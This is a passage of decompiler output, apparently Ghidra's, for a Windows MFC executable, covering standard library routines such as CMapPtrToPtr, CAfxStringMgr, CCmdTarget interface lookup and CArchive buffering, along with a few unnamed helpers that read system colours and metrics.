    *param_1 = p_Var6;
    *param_2 = pp_Var4[1];
    *param_3 = pp_Var4[2];
  }
  return;
}



undefined ** FUN_0040c317(void)

{
  return &PTR_s_CMapPtrToPtr_00429778;
}



// Library Function - Single Match
//  public: __thiscall CMapPtrToPtr::CMapPtrToPtr(int)
// 
// Library: Visual Studio 2008 Release

void __thiscall CMapPtrToPtr::CMapPtrToPtr(CMapPtrToPtr *this,int param_1)

{
  *(undefined ***)this = vftable;
  if (param_1 < 1) {
    param_1 = 10;
  }
  *(undefined4 *)(this + 4) = 0;
  *(undefined4 *)(this + 8) = 0x11;
  *(undefined4 *)(this + 0xc) = 0;
  *(undefined4 *)(this + 0x10) = 0;
  *(undefined4 *)(this + 0x14) = 0;
  *(int *)(this + 0x18) = param_1;
  return;
}



void __fastcall FUN_0040c350(undefined4 *param_1)

{
  *param_1 = CMapPtrToPtr::vftable;
  CMapPtrToPtr::RemoveAll((CMapPtrToPtr *)param_1);
  return;
}



// Library Function - Single Match
//  protected: struct CMapPtrToPtr::CAssoc * __thiscall CMapPtrToPtr::NewAssoc(void)
// 
// Library: Visual Studio 2008 Release

CAssoc * __thiscall CMapPtrToPtr::NewAssoc(CMapPtrToPtr *this)

{
  int iVar1;
  undefined4 uVar2;
  CPlex *pCVar3;
  undefined4 *puVar4;
  
  if (*(int *)(this + 0x10) == 0) {
    pCVar3 = CPlex::Create((CPlex **)(this + 0x14),*(uint *)(this + 0x18),0xc);
    iVar1 = *(int *)(this + 0x18);
    puVar4 = (undefined4 *)(pCVar3 + iVar1 * 0xc + -8);
    while (iVar1 = iVar1 + -1, -1 < iVar1) {
      *puVar4 = *(undefined4 *)(this + 0x10);
      *(undefined4 **)(this + 0x10) = puVar4;
      puVar4 = puVar4 + -3;
    }
  }
  puVar4 = *(undefined4 **)(this + 0x10);
  uVar2 = *puVar4;
  *(int *)(this + 0xc) = *(int *)(this + 0xc) + 1;
  *(undefined4 *)(this + 0x10) = uVar2;
  puVar4[1] = 0;
  puVar4[2] = 0;
  return (CAssoc *)puVar4;
}



// Library Function - Single Match
//  public: void * & __thiscall CMapPtrToPtr::operator[](void *)
// 
// Library: Visual Studio 2008 Release

void ** __thiscall CMapPtrToPtr::operator[](CMapPtrToPtr *this,void *param_1)

{
  void *pvVar1;
  undefined4 *puVar2;
  CMapPtrToPtr *local_8;
  
  pvVar1 = param_1;
  local_8 = this;
  puVar2 = (undefined4 *)GetAssocAt(this,param_1,(uint *)&param_1,(uint *)&local_8);
  if (puVar2 == (undefined4 *)0x0) {
    if (*(int *)(this + 4) == 0) {
      InitHashTable(this,*(uint *)(this + 8),1);
    }
    puVar2 = (undefined4 *)NewAssoc(this);
    puVar2[1] = pvVar1;
    *puVar2 = *(undefined4 *)((int)param_1 * 4 + *(int *)(this + 4));
    *(undefined4 **)((int)param_1 * 4 + *(int *)(this + 4)) = puVar2;
  }
  return (void **)(puVar2 + 2);
}



undefined4 * __thiscall FUN_0040c402(void *this,byte param_1)

{
  *(undefined ***)this = CMapPtrToPtr::vftable;
  CMapPtrToPtr::RemoveAll((CMapPtrToPtr *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return (undefined4 *)this;
}



undefined * FUN_0040c429(void)

{
  return &DAT_004342f4;
}



// Library Function - Single Match
//  public: virtual struct ATL::CStringData * __thiscall CAfxStringMgr::Allocate(int,int)
// 
// Library: Visual Studio 2008 Release

CStringData * __thiscall CAfxStringMgr::Allocate(CAfxStringMgr *this,int param_1,int param_2)

{
  CAfxStringMgr **ppCVar1;
  
  if ((-1 < param_1) &&
     (ppCVar1 = (CAfxStringMgr **)_malloc((param_1 + 1) * param_2 + 0x10),
     ppCVar1 != (CAfxStringMgr **)0x0)) {
    ppCVar1[1] = (CAfxStringMgr *)0x0;
    *ppCVar1 = this;
    ppCVar1[3] = (CAfxStringMgr *)0x1;
    ppCVar1[2] = (CAfxStringMgr *)param_1;
    return (CStringData *)ppCVar1;
  }
  return (CStringData *)0x0;
}



void FUN_0040c46e(void *param_1)

{
  _free(param_1);
  return;
}



// Library Function - Single Match
//  public: virtual struct ATL::CStringData * __thiscall CAfxStringMgr::Reallocate(struct
// ATL::CStringData *,int,int)
// 
// Library: Visual Studio 2008 Release

CStringData * __thiscall
CAfxStringMgr::Reallocate(CAfxStringMgr *this,CStringData *param_1,int param_2,int param_3)

{
  CStringData *pCVar1;
  
  if ((-1 < param_2) &&
     (pCVar1 = (CStringData *)_realloc(param_1,(param_2 + 1) * param_3 + 0x10),
     pCVar1 != (CStringData *)0x0)) {
    *(int *)(pCVar1 + 8) = param_2;
    return pCVar1;
  }
  return (CStringData *)0x0;
}



undefined4 __fastcall FUN_0040c4b2(undefined4 param_1)

{
  return param_1;
}



void __fastcall FUN_0040c4b5(undefined4 *param_1)

{
  *param_1 = CAfxStringMgr::vftable;
  param_1[4] = 2;
  param_1[2] = 0;
  param_1[3] = 0;
  *(undefined2 *)(param_1 + 5) = 0;
  *(undefined2 *)((int)param_1 + 0x16) = 0;
  param_1[1] = param_1;
  return;
}



undefined8 __fastcall FUN_0040c4d8(int param_1)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)(param_1 + 0x10);
  LOCK();
  iVar2 = *piVar1;
  *piVar1 = *piVar1 + 1;
  UNLOCK();
  return CONCAT44(iVar2,param_1 + 4);
}



// Library Function - Multiple Matches With Same Base Name
//  public: void __thiscall CObList::RemoveAll(void)
//  public: void __thiscall CPtrList::RemoveAll(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __fastcall RemoveAll(int param_1)

{
  *(undefined4 *)(param_1 + 0xc) = 0;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  *(undefined4 *)(param_1 + 4) = 0;
  CPlex::FreeDataChain(*(CPlex **)(param_1 + 0x14));
  *(undefined4 *)(param_1 + 0x14) = 0;
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  protected: void __thiscall CObList::FreeNode(struct CObList::CNode *)
//  protected: void __thiscall CPtrList::FreeNode(struct CPtrList::CNode *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall FreeNode(void *this,undefined4 *param_1)

{
  int *piVar1;
  void *extraout_ECX;
  
  if (param_1 == (undefined4 *)0x0) {
    AfxThrowNotSupportedException();
    this = extraout_ECX;
  }
  *param_1 = *(undefined4 *)((int)this + 0x10);
  piVar1 = (int *)((int)this + 0xc);
  *piVar1 = *piVar1 + -1;
  *(undefined4 **)((int)this + 0x10) = param_1;
  if (*piVar1 == 0) {
    RemoveAll((int)this);
  }
  return;
}



// Library Function - Single Match
//  public: void * __thiscall CPtrList::RemoveHead(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void * __thiscall CPtrList::RemoveHead(CPtrList *this)

{
  int *piVar1;
  int iVar2;
  void *pvVar3;
  CPtrList *extraout_ECX;
  
  if (this != (CPtrList *)0x0) goto LAB_0040c538;
  do {
    AfxThrowNotSupportedException();
    this = extraout_ECX;
LAB_0040c538:
    piVar1 = *(int **)(this + 4);
  } while (piVar1 == (int *)0x0);
  iVar2 = *piVar1;
  pvVar3 = (void *)piVar1[2];
  *(int *)(this + 4) = iVar2;
  if (iVar2 == 0) {
    *(undefined4 *)(this + 8) = 0;
  }
  else {
    *(undefined4 *)(iVar2 + 4) = 0;
  }
  FreeNode(this,piVar1);
  return pvVar3;
}



undefined4 FUN_0040c560(void)

{
  AFX_MODULE_THREAD_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleThreadState();
  return *(undefined4 *)(pAVar1 + 4);
}



// Library Function - Single Match
//  long __stdcall AfxInternalProcessWndProcException(class CException *,struct tagMSG const *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long AfxInternalProcessWndProcException(CException *param_1,tagMSG *param_2)

{
  long lVar1;
  
  if (param_2->message == 1) {
    lVar1 = -1;
  }
  else {
    if (param_2->message == 0xf) {
      ValidateRect(param_2->hwnd,(RECT *)0x0);
    }
    lVar1 = 0;
  }
  return lVar1;
}



// Library Function - Single Match
//  long __stdcall AfxProcessWndProcException(class CException *,struct tagMSG const *)
// 
// Library: Visual Studio 2008 Release

long AfxProcessWndProcException(CException *param_1,tagMSG *param_2)

{
  AFX_MODULE_THREAD_STATE *pAVar1;
  long lVar2;
  
  pAVar1 = AfxGetModuleThreadState();
  if (*(int **)(pAVar1 + 4) != (int *)0x0) {
                    // WARNING: Could not recover jumptable at 0x0040c5a7. Too many branches
                    // WARNING: Treating indirect jump as call
    lVar2 = (**(code **)(**(int **)(pAVar1 + 4) + 0x6c))();
    return lVar2;
  }
  lVar2 = AfxInternalProcessWndProcException(param_1,param_2);
  return lVar2;
}



// Library Function - Single Match
//  public: long __thiscall CWnd::SendMessageA(unsigned int,unsigned int,long)const 
// 
// Library: Visual Studio 2008 Release

long __thiscall CWnd::SendMessageA(CWnd *this,uint param_1,uint param_2,long param_3)

{
  LRESULT LVar1;
  
  LVar1 = SendMessageW(*(HWND *)(this + 0x20),param_1,param_2,param_3);
  return LVar1;
}



// Library Function - Single Match
//  public: struct IUnknown * __thiscall CCmdTarget::GetInterface(void const *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

IUnknown * __thiscall CCmdTarget::GetInterface(CCmdTarget *this,void *param_1)

{
  IUnknown *pIVar1;
  int **ppiVar2;
  int *piVar3;
  int **ppiVar4;
  
  pIVar1 = (IUnknown *)(**(code **)(*(int *)this + 0x44))(param_1);
  if (pIVar1 == (IUnknown *)0x0) {
    ppiVar2 = (int **)(**(code **)(*(int *)this + 0x38))();
                    // WARNING: Load size is inaccurate
    if ((((*param_1 == 0) && (*(int *)((int)param_1 + 4) == 0)) &&
        (*(int *)((int)param_1 + 8) == 0xc0)) && (*(int *)((int)param_1 + 0xc) == 0x46000000)) {
      do {
        for (piVar3 = ppiVar2[1]; *piVar3 != 0; piVar3 = piVar3 + 2) {
          if (((IUnknown *)(this + piVar3[1]))->lpVtbl != (IUnknownVtbl *)0x0) {
            return (IUnknown *)(this + piVar3[1]);
          }
        }
        ppiVar2 = (int **)*ppiVar2;
      } while (ppiVar2 != (int **)0x0);
    }
    else {
      do {
        for (ppiVar4 = (int **)ppiVar2[1]; piVar3 = *ppiVar4, piVar3 != (int *)0x0;
            ppiVar4 = ppiVar4 + 2) {
                    // WARNING: Load size is inaccurate
          if (((*piVar3 == *param_1) && (piVar3[1] == *(int *)((int)param_1 + 4))) &&
             ((piVar3[2] == *(int *)((int)param_1 + 8) &&
              ((piVar3[3] == *(int *)((int)param_1 + 0xc) &&
               (((IUnknown *)((int)ppiVar4[1] + (int)this))->lpVtbl != (IUnknownVtbl *)0x0)))))) {
            return (IUnknown *)((int)ppiVar4[1] + (int)this);
          }
        }
        ppiVar2 = (int **)*ppiVar2;
      } while (ppiVar2 != (int **)0x0);
    }
    pIVar1 = (IUnknown *)0x0;
  }
  return pIVar1;
}



// Library Function - Single Match
//  public: struct IUnknown * __thiscall CCmdTarget::QueryAggregates(void const *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

IUnknown * __thiscall CCmdTarget::QueryAggregates(CCmdTarget *this,void *param_1)

{
  undefined4 *puVar1;
  int *piVar2;
  int *piVar3;
  int iVar4;
  IUnknown *local_8;
  
  local_8 = (IUnknown *)this;
  piVar2 = (int *)(**(code **)(*(int *)this + 0x38))();
  do {
    for (piVar3 = (int *)piVar2[1]; *piVar3 != 0; piVar3 = piVar3 + 2) {
    }
    for (piVar3 = piVar3 + 1; *piVar3 != -1; piVar3 = piVar3 + 2) {
      puVar1 = *(undefined4 **)(this + *piVar3);
      if (puVar1 != (undefined4 *)0x0) {
        local_8 = (IUnknown *)0x0;
        iVar4 = (**(code **)*puVar1)(puVar1,param_1,&local_8);
        if ((iVar4 == 0) && (local_8 != (IUnknown *)0x0)) {
          return local_8;
        }
      }
    }
    piVar2 = (int *)*piVar2;
    if (piVar2 == (int *)0x0) {
      return (IUnknown *)0x0;
    }
  } while( true );
}



// Library Function - Single Match
//  _IsEqualGUID
// 
// Library: Visual Studio 2008 Release

bool __cdecl _IsEqualGUID(void *param_1,void *param_2)

{
  int iVar1;
  
  iVar1 = _memcmp(param_1,param_2,0x10);
  return (bool)('\x01' - (iVar1 != 0));
}



void __fastcall FUN_0040c6fc(int param_1)

{
  if (*(int *)(param_1 + 4) != 0) {
    FUN_0040ad54();
  }
  return;
}



// Library Function - Single Match
//  public: unsigned long __thiscall CCmdTarget::ExternalAddRef(void)
// 
// Library: Visual Studio 2008 Release

ulong __thiscall CCmdTarget::ExternalAddRef(CCmdTarget *this)

{
  ulong uVar1;
  
  if (*(int *)(this + 8) != 0) {
    uVar1 = (**(code **)(**(int **)(this + 8) + 4))(*(int **)(this + 8));
    return uVar1;
  }
  uVar1 = InterlockedIncrement((LONG *)(this + 4));
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3

LONG __fastcall FUN_0040c77d(int *param_1)

{
  LONG LVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  int *piStack_4;
  
  if (param_1[2] == 0) {
    piStack_4 = (int *)0x8;
    local_8 = 0x40c733;
    if (param_1[1] == 0) {
      LVar1 = 0;
    }
    else {
      LVar1 = InterlockedDecrement(param_1 + 1);
      if (LVar1 == 0) {
        AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,(AFX_MODULE_STATE *)param_1[7]);
        local_8 = 0;
        (**(code **)(*param_1 + 0x10))();
        local_8 = 0xffffffff;
        if (local_14 != 0) {
          FUN_0040ad54();
        }
      }
    }
    return LVar1;
  }
  piStack_4 = (int *)param_1[2];
  local_8 = 0x40c78c;
  LVar1 = (**(code **)(*piStack_4 + 8))();
  return LVar1;
}



// Library Function - Single Match
//  public: unsigned long __thiscall CCmdTarget::InternalQueryInterface(void const *,void * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

ulong __thiscall CCmdTarget::InternalQueryInterface(CCmdTarget *this,void *param_1,void **param_2)

{
  IUnknown *pIVar1;
  ulong uVar2;
  
  pIVar1 = GetInterface(this,param_1);
  *param_2 = pIVar1;
  if (pIVar1 == (IUnknown *)0x0) {
    pIVar1 = QueryAggregates(this,param_1);
    *param_2 = pIVar1;
    uVar2 = (-(uint)(pIVar1 != (IUnknown *)0x0) & 0x7fffbffe) + 0x80004002;
  }
  else {
    ExternalAddRef(this);
    uVar2 = 0;
  }
  return uVar2;
}



// Library Function - Single Match
//  public: unsigned long __thiscall CCmdTarget::ExternalQueryInterface(void const *,void * *)
// 
// Library: Visual Studio 2008 Release

ulong __thiscall CCmdTarget::ExternalQueryInterface(CCmdTarget *this,void *param_1,void **param_2)

{
  ulong uVar1;
  
  if (*(int *)(this + 8) != 0) {
    uVar1 = (**(code **)**(undefined4 **)(this + 8))(*(undefined4 **)(this + 8),param_1,param_2);
    return uVar1;
  }
  uVar1 = InternalQueryInterface(this,param_1,param_2);
  return uVar1;
}



void __fastcall FUN_0040c7f8(int param_1)

{
  DWORD DVar1;
  HBRUSH pHVar2;
  
  DVar1 = GetSysColor(0xf);
  *(DWORD *)(param_1 + 0x28) = DVar1;
  DVar1 = GetSysColor(0x10);
  *(DWORD *)(param_1 + 0x2c) = DVar1;
  DVar1 = GetSysColor(0x14);
  *(DWORD *)(param_1 + 0x30) = DVar1;
  DVar1 = GetSysColor(0x12);
  *(DWORD *)(param_1 + 0x34) = DVar1;
  DVar1 = GetSysColor(6);
  *(DWORD *)(param_1 + 0x38) = DVar1;
  pHVar2 = GetSysColorBrush(0xf);
  *(HBRUSH *)(param_1 + 0x24) = pHVar2;
  pHVar2 = GetSysColorBrush(6);
  *(HBRUSH *)(param_1 + 0x20) = pHVar2;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0040c83e(int param_1)

{
  int iVar1;
  HDC hdc;
  
  iVar1 = GetSystemMetrics(0xb);
  *(int *)(param_1 + 8) = iVar1;
  iVar1 = GetSystemMetrics(0xc);
  *(int *)(param_1 + 0xc) = iVar1;
  _DAT_00434310 = GetSystemMetrics(2);
  _DAT_00434310 = _DAT_00434310 + 1;
  _DAT_00434314 = GetSystemMetrics(3);
  _DAT_00434314 = _DAT_00434314 + 1;
  hdc = GetDC((HWND)0x0);
  iVar1 = GetDeviceCaps(hdc,0x58);
  *(int *)(param_1 + 0x18) = iVar1;
  iVar1 = GetDeviceCaps(hdc,0x5a);
  *(int *)(param_1 + 0x1c) = iVar1;
  ReleaseDC((HWND)0x0,hdc);
  return;
}



int __fastcall FUN_0040c89a(int param_1)

{
  HCURSOR pHVar1;
  
  FUN_0040c83e(param_1);
  *(undefined4 *)(param_1 + 0x24) = 0;
  FUN_0040c7f8(param_1);
  pHVar1 = LoadCursorW((HINSTANCE)0x0,(LPCWSTR)0x7f02);
  *(HCURSOR *)(param_1 + 0x3c) = pHVar1;
  pHVar1 = LoadCursorW((HINSTANCE)0x0,(LPCWSTR)0x7f00);
  *(HCURSOR *)(param_1 + 0x40) = pHVar1;
  *(undefined4 *)(param_1 + 0x10) = 2;
  *(undefined4 *)(param_1 + 0x14) = 2;
  *(undefined4 *)(param_1 + 0x50) = 0;
  *(undefined4 *)(param_1 + 0x44) = 0;
  return param_1;
}



// Library Function - Multiple Matches With Same Base Name
//  public: void __thiscall ATL::CStringT<char,class StrTraitMFC<char,class ATL::ChTraitsCRT<char> >
// >::FormatV(char const *,char *)
//  public: void __thiscall ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class
// ATL::ChTraitsCRT<wchar_t> > >::FormatV(wchar_t const *,char *)
// 
// Library: Visual Studio 2008 Release

void __thiscall FormatV(void *this,wchar_t *param_1,va_list param_2)

{
  int iVar1;
  wchar_t *_Dst;
  
  if (param_1 == (wchar_t *)0x0) {
    FUN_0040a834(-0x7ff8ffa9);
  }
  iVar1 = FID_conflict___vscwprintf(param_1,param_2);
  _Dst = (wchar_t *)ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT<char,0> *)this,iVar1);
  _vswprintf_s(_Dst,iVar1 + 1,param_1,param_2);
  ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT<wchar_t,0> *)this,iVar1);
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: void __cdecl ATL::CStringT<char,class StrTraitMFC<char,class ATL::ChTraitsCRT<char> >
// >::Format(char const *,...)
//  public: void __cdecl ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class
// ATL::ChTraitsCRT<wchar_t> > >::Format(wchar_t const *,...)
// 
// Library: Visual Studio 2008 Release

void __cdecl Format(void *param_1,wchar_t *param_2)

{
  FormatV(param_1,param_2,&stack0x0000000c);
  return;
}



// WARNING: Function: __EH_prolog3_catch_GS replaced with injection: EH_prolog3

void __fastcall FUN_0040c94a(int param_1)

{
  AfxDeleteObject((void **)(param_1 + 0x50));
  FUN_0041696b();
  return;
}



undefined4 Catch_0040c96e(void)

{
  int *piVar1;
  wchar_t *pwVar2;
  int iVar3;
  int unaff_EBP;
  
  FUN_0040b274((void *)(unaff_EBP + -0x418));
  piVar1 = *(int **)(unaff_EBP + -0x41c);
  iVar3 = *piVar1;
  *(undefined *)(unaff_EBP + -4) = 2;
  iVar3 = (**(code **)(iVar3 + 0xc))(unaff_EBP + -0x414,0x200,0);
  if (iVar3 == 0) {
    Format((void *)(unaff_EBP + -0x418),L"%s (%s:%d)");
  }
  else {
    Format((void *)(unaff_EBP + -0x418),L"%s (%s:%d)\n%s");
  }
  pwVar2 = *(wchar_t **)(unaff_EBP + -0x418);
  AfxMessageBox(pwVar2,0,0);
  *(undefined *)(unaff_EBP + -4) = 1;
  FUN_0040ae6f((int **)(pwVar2 + -8));
  (**(code **)(*piVar1 + 4))(1);
  return 0x40c968;
}



// Library Function - Single Match
//  void __cdecl ATL::Checked::tcscpy_s(wchar_t *,unsigned int,wchar_t const *)
// 
// Library: Visual Studio 2008 Release

void __cdecl ATL::Checked::tcscpy_s(wchar_t *param_1,uint param_2,wchar_t *param_3)

{
  errno_t eVar1;
  
  eVar1 = _wcscpy_s(param_1,param_2,param_3);
  AfxCrtErrorCheck(eVar1);
  return;
}



// Library Function - Single Match
//  public: static struct CPlex * __stdcall CPlex::Create(struct CPlex * &,unsigned int,unsigned
// int)
// 
// Library: Visual Studio 2008 Release

CPlex * CPlex::Create(CPlex **param_1,uint param_2,uint param_3)

{
  code *pcVar1;
  CPlex **ppCVar2;
  CPlex *pCVar3;
  
  if ((param_2 != 0) && (param_3 != 0)) {
    ppCVar2 = (CPlex **)operator_new(param_2 * param_3 + 4);
    *ppCVar2 = *param_1;
    *param_1 = (CPlex *)ppCVar2;
    return (CPlex *)ppCVar2;
  }
  AfxThrowNotSupportedException();
  pcVar1 = (code *)swi(3);
  pCVar3 = (CPlex *)(*pcVar1)();
  return pCVar3;
}



// Library Function - Single Match
//  public: void __thiscall CPlex::FreeDataChain(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall CPlex::FreeDataChain(CPlex *this)

{
  int *piVar1;
  
  if (this != (CPlex *)0x0) {
    do {
      piVar1 = *(int **)this;
      FUN_0040a3fc(this);
      this = (CPlex *)piVar1;
    } while (piVar1 != (int *)0x0);
  }
  return;
}



// Library Function - Single Match
//  int __stdcall AfxIsValidString(wchar_t const *,int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int AfxIsValidString(wchar_t *param_1,int param_2)

{
  return (uint)(param_1 != (wchar_t *)0x0);
}



// Library Function - Single Match
//  void __cdecl ATL::Checked::memmove_s(void *,unsigned int,void const *,unsigned int)
// 
// Library: Visual Studio 2008 Release

void __cdecl ATL::Checked::memmove_s(void *param_1,uint param_2,void *param_3,uint param_4)

{
  errno_t eVar1;
  
  eVar1 = _memmove_s(param_1,param_2,param_3,param_4);
  AfxCrtErrorCheck(eVar1);
  return;
}



// Library Function - Single Match
//  public: unsigned int __thiscall CArchive::Read(void *,unsigned int)
// 
// Library: Visual Studio 2008 Release

uint __thiscall CArchive::Read(CArchive *this,void *param_1,uint param_2)

{
  uint uVar1;
  int iVar2;
  void *pvVar3;
  int iVar4;
  uint uVar5;
  int local_c;
  uint local_8;
  
  if ((param_2 == 0) || (param_1 == (void *)0x0)) {
    uVar1 = 0;
  }
  else {
    if (((byte)this[0x18] & 1) == 0) {
      AfxThrowArchiveException(4,*(wchar_t **)(this + 0x14));
    }
    uVar1 = *(int *)(this + 0x2c) - (int)*(void **)(this + 0x28);
    if (param_2 < uVar1) {
      uVar1 = param_2;
    }
    FUN_0040be3a(param_1,param_2,*(void **)(this + 0x28),uVar1);
    *(uint *)(this + 0x28) = *(int *)(this + 0x28) + uVar1;
    param_1 = (void *)((int)param_1 + uVar1);
    uVar1 = param_2 - uVar1;
    if (uVar1 != 0) {
      iVar4 = uVar1 - uVar1 % *(uint *)(this + 0x20);
      local_c = 0;
      local_8 = iVar4;
      do {
        iVar2 = (**(code **)(**(int **)(this + 0x24) + 0x34))(param_1,local_8);
        param_1 = (void *)((int)param_1 + iVar2);
        local_c = local_c + iVar2;
        local_8 = local_8 - iVar2;
        if (iVar2 == 0) break;
      } while (local_8 != 0);
      uVar1 = uVar1 - local_c;
      if ((uVar1 != 0) && (local_c == iVar4)) {
        uVar5 = 0;
        if (*(int *)(this + 8) == 0) {
          if ((*(int *)(this + 0xc) != 0) ||
             (local_8 = *(uint *)(this + 0x20), *(uint *)(this + 0x20) < uVar1)) {
            local_8 = uVar1;
          }
          local_c = *(int *)(this + 0x30);
          do {
            iVar4 = (**(code **)(**(int **)(this + 0x24) + 0x34))(local_c,local_8);
            local_c = local_c + iVar4;
            local_8 = local_8 - iVar4;
            uVar5 = uVar5 + iVar4;
            if ((iVar4 == 0) || (local_8 == 0)) break;
          } while (uVar5 < uVar1);
          pvVar3 = *(void **)(this + 0x30);
          *(uint *)(this + 0x2c) = (int)pvVar3 + uVar5;
        }
        else {
          (**(code **)(**(int **)(this + 0x24) + 0x50))
                    (0,*(undefined4 *)(this + 0x20),this + 0x30,this + 0x2c);
          pvVar3 = *(void **)(this + 0x30);
        }
        *(void **)(this + 0x28) = pvVar3;
        uVar5 = *(int *)(this + 0x2c) - (int)pvVar3;
        if (uVar1 < (uint)(*(int *)(this + 0x2c) - (int)pvVar3)) {
          uVar5 = uVar1;
        }
        FUN_0040be3a(param_1,uVar1,pvVar3,uVar5);
        *(uint *)(this + 0x28) = *(int *)(this + 0x28) + uVar5;
        uVar1 = uVar1 - uVar5;
      }
    }
    uVar1 = param_2 - uVar1;
  }
  return uVar1;
}



// Library Function - Single Match
//  public: void __thiscall CArchive::Flush(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CArchive::Flush(CArchive *this)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = *(int *)(this + 0x28);
  if (((byte)this[0x18] & 1) == 0) {
    piVar1 = (int *)(this + 0x30);
    iVar2 = *piVar1;
    if (*(int *)(this + 8) == 0) {
      if (iVar3 != iVar2) {
        (**(code **)(**(int **)(this + 0x24) + 0x38))(iVar2,iVar3 - iVar2);
      }
    }
    else {
      if (iVar3 != iVar2) {
        (**(code **)(**(int **)(this + 0x24) + 0x50))(2,iVar3 - iVar2,0,0);
      }
      (**(code **)(**(int **)(this + 0x24) + 0x50))
                (1,*(undefined4 *)(this + 0x20),piVar1,this + 0x2c);
    }
    iVar3 = *piVar1;
  }
  else {
    if (*(int *)(this + 0x2c) != iVar3) {
      iVar3 = iVar3 - *(int *)(this + 0x2c);
      (**(code **)(**(int **)(this + 0x24) + 0x28))(iVar3,iVar3 >> 0x1f,1);
    }
    iVar3 = *(int *)(this + 0x2c);
  }
  *(int *)(this + 0x28) = iVar3;
  return;
}



// Library Function - Single Match
//  public: void __thiscall CArchive::FillBuffer(unsigned int)
// 
// Library: Visual Studio 2008 Release

void __thiscall CArchive::FillBuffer(CArchive *this,uint param_1)

{
  int *piVar1;
  void *pvVar2;
  uint uVar3;
  void *pvVar4;
  int iVar5;
  CArchive *unaff_ESI;
  int iVar6;
  undefined4 uVar7;
  int *in_stack_ffffffe4;
  uint local_8;
  
  if (((byte)this[0x18] & 1) != 0) goto LAB_0040cc6d;
  in_stack_ffffffe4 = *(int **)(this + 0x14);
  uVar7 = 4;
  do {
    AfxThrowArchiveException(uVar7,(wchar_t *)in_stack_ffffffe4);
LAB_0040cc6d:
    pvVar2 = *(void **)(this + 0x28);
    piVar1 = (int *)(this + 0x2c);
    local_8 = *piVar1 - (int)pvVar2;
    uVar3 = param_1 + local_8;
    if (*(int *)(this + 8) == 0) {
      pvVar4 = *(void **)(this + 0x30);
      if (pvVar4 < pvVar2) {
        if (0 < (int)local_8) {
          ATL::Checked::memmove_s(pvVar4,*piVar1 - (int)pvVar4,pvVar2,local_8);
          pvVar4 = *(void **)(this + 0x30);
          *(void **)(this + 0x28) = pvVar4;
          *piVar1 = (int)pvVar4 + local_8;
        }
        if (*(int *)(this + 0xc) == 0) {
          param_1 = *(uint *)(this + 0x20);
        }
        param_1 = param_1 - local_8;
        iVar6 = local_8 + (int)pvVar4;
        do {
          in_stack_ffffffe4 = (int *)param_1;
          iVar5 = (**(code **)(**(int **)(this + 0x24) + 0x34))(iVar6);
          local_8 = local_8 + iVar5;
          param_1 = param_1 - iVar5;
          iVar6 = iVar6 + iVar5;
          if ((iVar5 == 0) || (param_1 == 0)) break;
        } while (local_8 < uVar3);
        *(int *)(this + 0x28) = *(int *)(this + 0x30);
        *piVar1 = *(int *)(this + 0x30) + local_8;
      }
    }
    else {
      if (local_8 != 0) {
        (**(code **)(**(int **)(this + 0x24) + 0x28))(-local_8,(int)-local_8 >> 0x1f,1);
      }
      in_stack_ffffffe4 = piVar1;
      (**(code **)(**(int **)(this + 0x24) + 0x50))(0,*(undefined4 *)(this + 0x20),this + 0x30);
      *(undefined4 *)(this + 0x28) = *(undefined4 *)(this + 0x30);
    }
    if (uVar3 <= (uint)(*piVar1 - *(int *)(this + 0x28))) {
      return;
    }
    uVar7 = 3;
    this = unaff_ESI;
  } while( true );
}



// Library Function - Single Match
//  public: class CArchive & __thiscall CArchive::operator<<(unsigned short)
// 
// Library: Visual Studio 2008 Release

CArchive * __thiscall CArchive::operator<<(CArchive *this,ushort param_1)

{
  CArchive *extraout_ECX;
  CArchive *this_00;
  
  this_00 = this;
  if ((~*(uint *)(this + 0x18) & 1) == 0) {
    AfxThrowArchiveException(2,*(wchar_t **)(this + 0x14));
    this_00 = extraout_ECX;
  }
  if (*(uint *)(this + 0x2c) < *(int *)(this + 0x28) + 2U) {
    Flush(this_00);
  }
  **(ushort **)(this + 0x28) = param_1;
  *(int *)(this + 0x28) = *(int *)(this + 0x28) + 2;
  return this;
}



// Library Function - Single Match
//  public: class CArchive & __thiscall CArchive::operator<<(unsigned long)
// 
// Library: Visual Studio 2010 Release

CArchive * __thiscall CArchive::operator<<(CArchive *this,ulong param_1)

{
  CArchive *extraout_ECX;
  CArchive *this_00;
  
  this_00 = this;
  if ((~*(uint *)(this + 0x18) & 1) == 0) {
    AfxThrowArchiveException(2,*(wchar_t **)(this + 0x14));
    this_00 = extraout_ECX;
  }
  if (*(uint *)(this + 0x2c) < *(int *)(this + 0x28) + 4U) {
    Flush(this_00);
  }
  **(ulong **)(this + 0x28) = param_1;
  *(int *)(this + 0x28) = *(int *)(this + 0x28) + 4;
  return this;
}



// Library Function - Single Match
//  public: class CArchive & __thiscall CArchive::operator>>(unsigned short &)
// 
// Library: Visual Studio 2008 Release

